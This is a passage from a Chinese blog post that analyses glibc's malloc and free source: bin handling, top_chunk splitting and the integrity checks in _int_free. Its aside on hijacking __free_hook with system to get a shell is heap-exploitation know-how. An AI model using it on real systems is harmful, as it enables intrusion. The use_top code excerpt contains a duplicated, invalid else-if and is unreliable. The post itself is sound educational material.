(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">        have to perform a complete insert here.  */</span></span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它确实有<code>chunk</code>呢？然后其实它还是跟前面一样的，在<code>large bin</code>中找到<code>chunk</code>的处理方式，<code>unlink</code>，切割，判断，设置标志位，切割后及时更新<code>last_remainder</code>，这里就是一个<code>large bin</code>的遍历。</p><p>还要讲一下的就是这个<code>check</code>，依旧是对<code>unsorted bin</code>的一个<code>check</code>，判断第一个<code>unsorted chunk</code>的<code>bk</code>指针是否指向<code>unsorted bin</code>的位置。这里需要把割剩下的<code>chunk</code>重新放回<code>unsorted bin</code>。至此整个<code>unsorted bin</code>和<code>large bin</code>的分配就讲完了。</p><h3 id="第六段：切割top-chunk"><a href="#第六段：切割top-chunk" class="headerlink" title="第六段：切割top_chunk"></a>第六段：切割top_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">             (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">             search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">             less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">             be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">             limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">             MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">             exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">             reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">             to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        av-&gt;top = remainder;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">             here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">            <span class="comment">/* restore original bin index */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                idx = smallbin_index (nb);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">                alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较简单，就是说先从<code>av-&gt;top</code>拿到<code>top_chunk</code>的地址。判断大小尝试切割，如果不能切割，它也不会尽量去麻烦操作系统，先调用<code>malloc_consolidate</code>去合并所有的<code>fast bin</code>里面的<code>chunk</code>。然后合并之后接着步入之前的循环，重新找一次<code>small bin</code> <code>large bin</code> <code>unsorted bin</code>，因为现在可能已经有合适的<code>chunk</code>了对吧。</p><p>然后如果还是没有合适的呢？就会进入这里的<code>else</code>，调用<code>sysmalloc</code>去分配内存，一次还是分配<code>0x21000</code>的<code>chunk</code>作为新的<code>top_chunk</code>，原来的<code>top_chunk</code>将会被<code>free</code>，一般来说如果你没有改过<code>top_chunk</code>的<code>size</code>，那么新的和旧的<code>top_chunk</code>将会是物理相邻，如果<code>free</code> 的<code>top_chunk</code>不在<code>fast bin</code>范围内，那就会和新的<code>top_chunk</code>发生合并。那么这一整个<code>malloc</code>源码就解读完了，我们来做一下总结。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>检查是否设置了<code>malloc_hook</code>，若设置了则跳转进入<code>malloc_hook</code>，若未设置则获取当前的分配区，进入<code>int_malloc</code>函数。</p></li><li><p>如果当前的分配区为空，则调用<code>sysmalloc</code>分配空间，返回指向新<code>chunk</code>的指针，否则进入下一步。</p></li><li><p>若用户申请的大小在<code>fast bin</code>的范围内，则考虑寻找对应<code>size</code>的<code>fast bin chunk</code>，判断该<code>size</code>的<code>fast bin</code>是否为空，不为空则取出第一个<code>chunk</code>返回，否则进入下一步。</p></li><li><p>如果用户申请的大小符合<code>small bin</code>的范围，则在相应大小的链表中寻找<code>chunk</code>，若<code>small bin</code>未初始化，则调用<code>malloc_consolidate</code>初始化分配器，然后继续下面的步骤，否则寻找对应的<code>small bin</code>的链表，如果该<code>size</code> 的<code>small bin</code>不为空则取出返回，否则继续下面的步骤。如果申请的不在<code>small bin</code>的范围那么调用<code>malloc_consolidate</code>去合并所有<code>fast bin</code>并继续下面的步骤。</p></li><li><p>用户申请的大小符合<code>large bin</code>或<code>small bin</code>链表为空，开始处理<code>unsorted bin</code>链表中的<code>chunk</code>。在<code>unsorted bin</code>链表中查找符合大小的<code>chunk</code>，若用户申请的大小为<code>small bin</code>，<code>unsorted bin</code>中只有一块chunk并指向<code>last_remainder</code>，且<code>chunk size</code>的大小大于<code>size+MINSIZE</code>，则对当前的<code>chunk</code>进行分割，更新分配器中的<code>last_remainder</code>，切出的<code>chunk</code>返回给用户，剩余的<code>chunk</code>回<code>unsorted bin</code>。否则进入下一步。</p></li><li><p>将当前的<code>unsorted bin</code>中的<code>chunk</code>取下，若其<code>size</code>恰好为用户申请的<code>size</code>，则将<code>chunk</code>返回给用户。否则进入下一步</p></li><li><p>获取当前<code>chunk size</code>所对应的bins数组中的头指针。（<code>large bin</code>需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于<code>MAX_ITERS</code>则不在处理。进入下一步。</p></li><li><p>如果用户申请的空间的大小符合<code>large bin</code>的范围或者对应的small bin链表为空且<code>unsorted bin</code>链表中没有符合大小的<code>chunk</code>，则在对应的<code>large bin</code>链表中查找符合条件的<code>chunk</code>（即其大小要大于用户申请的<code>size</code>）。若找到相应的<code>chunk</code>则对<code>chunk</code>进行拆分，返回符合要求的<code>chunk</code>（无法拆分时整块返回）。否则进入下一步。</p></li><li><p>根据<code>binmap</code>找到表示更大<code>size</code>的<code>large bin</code>链表，若其中存在空闲的<code>chunk</code>，则将<code>chunk</code>拆分之后返回符合要求的部分，并更新<code>last_remainder</code>。否则进入下一步。</p></li><li><p>若<code>top_chunk</code>的大小大于用户申请的空间的大小，则将<code>top_chunk</code>拆分，返回符合用户要求的<code>chunk</code>，并更新<code>last_remainder</code>，否则进入下一步。</p></li><li><p>若<code>fast bin</code>不为空，则调用<code>malloc_consolidate</code>合并<code>fast bin</code>，重新回到第四步再次从<code>small bin</code>搜索。否则进入下一步。</p></li><li><p>调用<code>sysmalloc</code>分配空间，<code>free top chunk</code>返回指向新<code>chunk</code>的指针。</p></li><li><p>若<code>_int_malloc</code>函数返回的<code>chunk</code>指针为空，且当前分配区指针不为空，则再次尝试<code>_int_malloc</code></p></li><li><p>对<code>chunk</code>指针进行检查，主要检查<code>chunk</code>是否为<code>mmap</code>，且位于当前的分配区内。</p><h2 id="free源码分析"><a href="#free源码分析" class="headerlink" title="free源码分析"></a>free源码分析</h2></li></ol><p>那我们现在开始解读一下<code>free</code>的源码</p><h3 id="libc-free源码分析"><a href="#libc-free源码分析" class="headerlink" title="__libc_free源码分析"></a>__libc_free源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>函数也是直接调用这里的<code>__libc_free</code>函数完成<code>chunk</code>的释放的操作的。</p><p>跟<code>malloc</code>一样，先读取<code>__free_hook</code>看看是否为空，如果为空则直接由<code>free_hook</code>指向的函数代为执行<code>free</code>，这里也是我们经常劫持的钩子函数，而且<code>free_hook</code>劫持起来比<code>malloc_hook</code>困难。但是一旦劫持成功也会很方便，就是说<code>malloc</code>_hook函数我只能写<code>one_gadget</code>，而一旦条件苛刻那么就还得调栈啊之类的一些操作。劫持到了<code>free_hook</code>我们就直接写<code>system</code>函数，然后<code>free</code>一个内容为<code>/bin/sh</code>的堆块就能稳定<code>get shell</code>。</p><p>然后执行<code>free(NULL)</code>无任何效果，直接返回。</p><p>将传入的指针转换为<code>chunk</code>的指针，因为用户得到的指针其实是<code>&amp;chunk-&gt;fd</code>，这里改为<code>chunk</code>的指针。然后这里需要寻找这个堆块的分配器，看看这个堆块是从哪里分配出来的。之后就是调用<code>_int_free</code>函数去真正释放chunk</p><h3 id="int-free源码分析"><a href="#int-free源码分析" class="headerlink" title="_int_free源码分析"></a>_int_free源码分析</h3><p>同样我们分成几段来讲解，总源码也不直接给了。</p><h4 id="第一段：free前的各种check"><a href="#第一段：free前的各种check" class="headerlink" title="第一段：free前的各种check"></a>第一段：free前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line">INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>首先变量定义是差不多的，然后这里进行了一项<code>check</code>。</p><ol><li><code>(uintptr_t) p &gt; (uintptr_t) -size</code>：这里让我有点费解，指针和size进行比较。通常情况下size取负之后会变得很大，比如<code>0xfff...</code>这样的大数值通常指针不会指向这样的地址，f开头的一般都是内核地址。所以<code>p&gt;0xfff....</code>主要是应该要检测被<code>free</code>的<code>chunk</code>的<code>size</code>不要过大。</li><li><code>misaligned_chunk (p)</code>：这里的话主要是这个<code>chunk</code>的指针与上掩码，掩码就是<code>0x10-1</code>也就是<code>0xf</code>，取出后四位观察是否为0，如果不为0则说明指针错误了，机会在这里报错。这里主要是检查对齐，指针需要指到<code>0x10</code>的整倍数的<code>chunk</code>才能被正常<code>free</code>，就是不知道<code>malloc</code>为什么不开这个检测，开了又有一大批利用手段用不了了(狗头。</li></ol><p><code>check</code>不通过就会用<code>malloc_printerr</code>打印错误信息，然后处理锁上的一些内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>又有一个<code>check</code></p><ol><li><code>size &lt; MINSIZE</code>：如果<code>size</code>还比<code>MINSIZE</code>要小，那肯定<code>size</code>肯定出错了。</li><li><code>!aligned_OK (size)</code>：<code>chunk size</code>也要对齐，但是这个<code>check</code>一般不会被触发，因为再取出<code>chunk size</code>的时候就会把最低位与掉。</li></ol><p>然后它这里需要<code>check</code>一下这个<code>free</code>的<code>chunk</code>是正在使用的，怎么<code>check</code>呢，那就肯定是下一个<code>chunk</code>的<code>prev_inuse</code>位为0啦，具体的实现函数是这样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_inuse_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mchunkptr next;</span><br><span class="line"></span><br><span class="line">  do_check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">/* mmapped chunks have no next/prev */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check whether it claims to be in use ... */</span></span><br><span class="line">  assert (inuse (p));</span><br><span class="line"></span><br><span class="line">  next = next_chunk (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... and is surrounded by OK chunks.</span></span><br><span class="line"><span class="comment">     Since more things can be checked with free chunks than inuse ones,</span></span><br><span class="line"><span class="comment">     if an inuse chunk borders them and debug is on, it&#x27;s worth doing them.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Note that we cannot even look at prev unless it is not inuse */</span></span><br><span class="line">      mchunkptr prv = prev_chunk (p);</span><br><span class="line">      assert (next_chunk (prv) == p);</span><br><span class="line">      do_check_free_chunk (av, prv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (next == av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (prev_inuse (next));</span><br><span class="line">      assert (chunksize (next) &gt;= MINSIZE);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!inuse (next))</span><br><span class="line">    do_check_free_chunk (av, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多的也不说了，相信都能理解的，根据自身指针和自身大小就可以很容易知道下一个<code>chunk</code>的位置，然后检测一下<code>prev_inuse</code>位判断我当前<code>chunk</code>是否被使用。</p><h3 id="fast-bin范围的处理"><a href="#fast-bin范围的处理" class="headerlink" title="fast bin范围的处理"></a>fast bin范围的处理</h3><h4 id="fast-bin的check"><a href="#fast-bin的check" class="headerlink" title="fast bin的check"></a>fast bin的check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">    &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">        of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">        after getting the lock.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        